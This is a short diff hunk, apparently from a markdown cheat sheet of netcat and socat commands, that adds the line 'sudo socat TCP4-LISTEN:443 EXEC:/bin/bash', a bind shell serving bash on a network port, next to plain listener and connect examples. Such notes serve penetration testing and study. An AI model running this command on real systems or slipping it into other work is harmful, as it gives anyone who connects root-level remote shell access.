@@ -65,6 +65,7 @@ socat - TCP4:<remote>:80
 echo "Socat Listener"
 sudo nc -lvp localhost 443
 sudo socat TCP4-LISTEN:443 STDOUT
+sudo socat TCP4-LISTEN:443 EXEC:/bin/bash
 ```
 
 ```bash
